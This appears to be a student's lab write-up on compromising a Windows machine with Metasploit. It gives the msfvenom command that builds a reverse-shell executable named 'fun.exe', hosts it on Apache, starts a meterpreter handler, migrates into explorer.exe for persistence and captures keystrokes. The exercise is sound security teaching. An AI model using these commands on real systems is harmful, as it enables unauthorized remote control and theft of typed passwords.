# Compromising-windows-using-Metasploit
# NAME-SRILAKSHMI BH
# REG.NO-212224100057
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="601" height="294" alt="image" src="https://github.com/user-attachments/assets/1fd840f1-8bc9-475f-8d6d-66ee26bed554" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="916" height="177" alt="image" src="https://github.com/user-attachments/assets/d78e217d-156b-4057-8cb5-f05fb6ceedd1" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:


<img width="319" height="46" alt="image" src="https://github.com/user-attachments/assets/e0a82961-0370-4ac0-83f1-f0767d6ed213" />

Start apache server
sudo systemctl apache2 start

## OUTPUT:



Check the status of apache2

<img width="1120" height="616" alt="image" src="https://github.com/user-attachments/assets/57c5ebda-7dee-462f-aa2e-8ef0e1c81ed7" />


Invoke msfconsole:
## OUTPUT:

<img width="844" height="346" alt="image" src="https://github.com/user-attachments/assets/67b45606-64cc-42aa-b304-dccd26ce768f" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="328" height="62" alt="image" src="https://github.com/user-attachments/assets/85add79c-3c92-4a5a-b540-c93ad5a3a164" />




Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="1023" height="240" alt="image-7" src="https://github.com/user-attachments/assets/0bc20b75-1f05-4b2d-b941-3b7f42ca8a0f" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1023" height="240" alt="image-13" src="https://github.com/user-attachments/assets/fe4a857d-5885-4a8e-83fd-1bc48f8a5920" />



On kali/parrot give the command exploit
## OUTPUT:

<img width="843" height="710" alt="244990924-7e6e28fb-b095-4fd1-81f8-a0292f82c9a2" src="https://github.com/user-attachments/assets/b9b94af1-3d4f-4f78-86c6-9557653e4ca5" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:

<img width="843" height="710" alt="244990924-7e6e28fb-b095-4fd1-81f8-a0292f82c9a2" src="https://github.com/user-attachments/assets/8c46046a-115e-4ddf-b752-b86748d8446c" />

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="1600" height="837" alt="244990928-836e6efa-423f-4553-ad2f-19170b010892" src="https://github.com/user-attachments/assets/5e2046e1-c45b-459b-adaa-e3aebf3d7cef" />




Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:


<img width="1074" height="571" alt="244990952-35be18d7-51b0-4529-8fd8-76740f0c9ba6" src="https://github.com/user-attachments/assets/65316598-ba60-47ee-9d44-25432eda3ab5" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="1200" height="118" alt="244990920-d40a4428-0c65-4855-be1d-c278766082fb" src="https://github.com/user-attachments/assets/34fc0541-d907-41c8-bdd3-9a9eab590811" />



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
